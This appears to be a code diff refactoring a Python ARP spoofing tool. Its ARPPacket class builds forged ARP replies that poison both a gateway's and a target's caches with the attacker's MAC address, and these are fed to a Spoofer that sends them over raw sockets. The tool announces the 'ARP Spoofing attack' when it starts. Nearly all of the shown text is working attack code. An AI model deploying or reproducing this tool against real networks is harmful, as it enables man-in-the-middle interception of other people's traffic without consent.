@@ -14,70 +14,58 @@ from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
 
 
 class ARPPacket(object):
-    ETHER_T = b'\x08\x06'  # Ethertype code of ARP per RFC 7042
+    ETHER_T = b'\x08\x06'  # Ethertype code of ARP (IETF RFC 7042)
 
     def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                  gateway_ip: str, target_ip: str):
         self.gateway_ip = inet_aton(gateway_ip)
         self.target_ip = inet_aton(target_ip)
-        self.arp_header = None
-        self.gateway_arp_packet = None
-        self.target_arp_packet = None
         self.attacker_mac = self._mac_to_hex(attacker_mac)
         self.gateway_mac = self._mac_to_hex(gateway_mac)
         self.target_mac = self._mac_to_hex(target_mac)
-        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + \
-                                  self.ETHER_T
-        self.target_eth_header = self.target_mac + self.attacker_mac + \
-                                 self.ETHER_T
 
     @property
     def arp_header(self):
-        """
-        Gets a byte-string representation of the ARP header of a packet.
-        Sets the ARP header of a packet as defined by RFC 826.
-        """
-        return self._arp_header
+        """Builds a byte-string representation of the ARP header of a
+        packet as defined by IETF RFC 826."""
+        hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
+        protocol_address = b'\x08\x00'  # '\x08\x00' = IP
+        hardware_address_len = b'\x06'
+        protocol_address_len = b'\x04'
+        opcode = b'\x00\x02'            # '\x00\x02' = REPLY
+        return b''.join((hardware_address, protocol_address,
+                         hardware_address_len, protocol_address_len,
+                         opcode))
 
-    @arp_header.setter
-    def arp_header(self, fields):
-        if fields is None:                  # ARP header field structure
-            hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
-            protocol_address = b'\x08\x00'  # '\x08\x00' = IP
-            hardware_address_len = b'\x06'
-            protocol_address_len = b'\x04'
-            opcode = b'\x00\x02'            # '\x00\x02' = REPLY
-            arp_header = b''.join((hardware_address, protocol_address,
-                                   hardware_address_len, protocol_address_len,
-                                   opcode))
-        else:
-            arp_header = b''.join(*fields)
-        self._arp_header = arp_header
+    @property
+    def eth_header_to_gateway(self):
+        return self.gateway_mac + self.attacker_mac + self.ETHER_T
+
+    @property
+    def eth_header_to_target(self):
+        return self.target_mac + self.attacker_mac + self.ETHER_T
+
+    @property
+    def arp_pkt_to_gateway(self):
+        return b''.join((self.eth_header_to_gateway, self.arp_header,
+                         self.attacker_mac, self.target_ip,
+                         self.gateway_mac, self.gateway_ip))
+
+    @property
+    def arp_pkt_to_target(self):
+        return b''.join((self.eth_header_to_target, self.arp_header,
+                         self.attacker_mac, self.gateway_ip,
+                         self.target_mac, self.target_ip))
 
     @staticmethod
-    def _mac_to_hex(mac_addr: str) -> bytes:
+    def _mac_to_hex(mac_address: str) -> bytes:
         """
         Transform a MAC address string from IEEE 802.3 standard to a
         byte sequence of hexadecimal values.
         Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12#4'
         """
         return b''.join(bytes.fromhex(octet) for octet in
-                        re.split('[:-]', mac_addr))
-
-    def get_packets(self) -> tuple:
-        self.gateway_arp_packet = b''.join((self.gateway_eth_header,
-                                            self.arp_header,
-                                            self.attacker_mac,
-                                            self.target_ip,
-                                            self.gateway_mac,
-                                            self.gateway_ip))
-        self.target_arp_packet = b''.join((self.target_eth_header,
-                                           self.arp_header,
-                                           self.attacker_mac,
-                                           self.gateway_ip,
-                                           self.target_mac,
-                                           self.target_ip))
-        return self.gateway_arp_packet, self.target_arp_packet
+                        re.split('[:-]', mac_address))
 
 
 class Spoofer(object):
@@ -107,10 +95,9 @@ def spoof(args):
                        target_mac=args.targetmac,
                        gateway_ip=args.gateip,
                        target_ip=args.targetip)
-    gate_arp_pkt, target_arp_pkt = packet.get_packets()
     spoofer = Spoofer(interface=args.interface,
-                      gateway_arp_packet=gate_arp_pkt,
-                      target_arp_packet=target_arp_pkt,
+                      gateway_arp_packet=packet.arp_pkt_to_gateway,
+                      target_arp_packet=packet.arp_pkt_to_target,
                       interval=args.interval)
 
     print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
